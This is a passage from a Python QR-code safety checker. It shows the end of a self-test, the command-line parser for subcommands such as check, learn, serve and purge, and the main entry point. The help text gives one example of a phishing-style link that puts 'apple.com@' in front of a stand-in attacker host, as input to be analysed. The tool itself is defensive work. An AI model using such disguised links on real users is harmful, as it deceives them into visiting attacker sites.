                  and api.get_json()["not_a_malware_scanner"] is True)
            check("the api rejects an empty payload",
                  cl.get("/api/check").status_code == 400)

        print("\n Retention")
        cmd_purge(argparse.Namespace(all=False, keep=1))
        check("purge keeps exactly the newest check",
              q1("SELECT COUNT(*) c FROM scans", ())["c"] == 1)
        check("purge removes orphaned payloads and findings",
              all(q1(f"SELECT COUNT(*) c FROM {t} WHERE scan_id NOT IN "
                     f"(SELECT id FROM scans)", ())["c"] == 0
                  for t in ("payloads", "findings")))
        cmd_purge(argparse.Namespace(all=True, keep=1))
        check("purge --all clears everything",
              q1("SELECT COUNT(*) c FROM scans", ())["c"] == 0)
    finally:
        set_db_path(original)
        shutil.rmtree(tmp, ignore_errors=True)

    line("=")
    print(f"  {len(passed)} passed, {len(failed)} failed")
    if failed:
        print("  Failed: " + ", ".join(failed))
    else:
        print("  All checks passed. Nothing was fetched at any point, and the temporary\n"
              "  database and images have been removed.")
    line("=")
    return 0 if not failed else 1


# =============================================================================
# SECTION 14 - Entry point
# =============================================================================

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=os.path.basename(__file__),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"{APP_NAME} v{VERSION} - see what a QR code really contains, "
                    f"by {AUTHOR}",
        epilog=textwrap.dedent(f"""\
            examples
              %(prog)s learn                      how QR codes trick people
              %(prog)s examples --verbose         every technique, scored
              %(prog)s check "https://apple.com@evil.test/login"
              %(prog)s check --image photo.jpg
              %(prog)s decode --image photo.jpg   just decode, do not judge
              %(prog)s serve                      web app on http://127.0.0.1:5000
              %(prog)s selftest

            *** {NEVER_FETCHES} ***

            {DISCLAIMER_SHORT}
            """))
    p.add_argument("--db", default=DEFAULT_DB,
                   help=f"SQLite database file (default: {DEFAULT_DB}, env QRSAFE_DB)")
    p.add_argument("--version", action="version", version=f"{APP_NAME} {VERSION} by {AUTHOR}")
    sub = p.add_subparsers(dest="cmd")

    s = sub.add_parser("check", help="analyse a payload or an image of a QR code")
    s.add_argument("payload", nargs="?", default="",
                   help="the decoded text, e.g. 'https://...'")
    s.add_argument("--image", help="a photo or screenshot containing a QR code")
    s.add_argument("--verbose", action="store_true", help="show the full URL anatomy")
    s.add_argument("--show", type=int, default=12)
    s.add_argument("--note")
    s.set_defaults(func=cmd_check)

    s = sub.add_parser("decode", help="decode an image without judging it")
    s.add_argument("--image", required=True)
    s.set_defaults(func=cmd_decode)

    s = sub.add_parser("examples", help="every technique this tool knows, scored")
    s.add_argument("--verbose", action="store_true")
    s.add_argument("--write-images", metavar="DIR",
                   help="write QR images of the examples, for testing this tool")
    s.set_defaults(func=cmd_examples)

    s = sub.add_parser("learn", help="how QR codes are used to trick people")
    s.set_defaults(func=cmd_learn)

    s = sub.add_parser("make", help="write a QR image, for testing this tool")
    s.add_argument("payload")
    s.add_argument("--out", default="qr.png")
    s.set_defaults(func=cmd_make)

    s = sub.add_parser("scans", help="list previous checks")
    s.add_argument("--limit", type=int, default=25)
    s.set_defaults(func=cmd_scans)

    s = sub.add_parser("serve", help="start the web app")
    s.add_argument("--host", default="127.0.0.1")
    s.add_argument("--port", type=int, default=5000)
    s.add_argument("--debug", action="store_true")
    s.set_defaults(func=cmd_serve)

    s = sub.add_parser("export", help="write a report to a file")
    s.add_argument("--scan", type=int)
    s.add_argument("--format", choices=["json", "csv", "html"], default="html")
    s.add_argument("--out")
    s.set_defaults(func=cmd_export)

    s = sub.add_parser("logs", help="local event log")
    s.add_argument("--level", choices=["INFO", "WARN", "ERROR", "info", "warn", "error"])
    s.add_argument("--limit", type=int, default=50)
    s.set_defaults(func=cmd_logs)

    s = sub.add_parser("purge", help="delete stored checks")
    s.add_argument("--keep", type=int, default=20)
    s.add_argument("--all", action="store_true")
    s.set_defaults(func=cmd_purge)

    s = sub.add_parser("selftest", help="verify every check (temporary database)")
    s.set_defaults(func=cmd_selftest)

    s = sub.add_parser("version", help="versions, capabilities and the disclaimer")
    s.set_defaults(func=cmd_version)
    return p


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    set_db_path(args.db)
    if not getattr(args, "cmd", None):
        parser.print_help()
        return 0
    if args.cmd == "check" and not args.payload and not args.image:
        print("Give a payload to check, or --image FILE.\n"
              "  qrsafe.py check \"https://example.com/\"\n"
              "  qrsafe.py check --image photo.jpg")
        return 1
    if args.cmd != "selftest":
        init_db()
    try:
        rc = args.func(args)
        return rc if isinstance(rc, int) else 0
    except BrokenPipeError:
        try:
            os.dup2(os.open(os.devnull, os.O_WRONLY), sys.stdout.fileno())
        except Exception:
            pass
        return 0
    except KeyboardInterrupt:
        print("\nInterrupted.")
        return 130
    except sqlite3.OperationalError as e:
        print(f"Database error: {e}\nIs another copy running against {db_path()}?")
        return 1


if __name__ == "__main__":
    sys.exit(main())
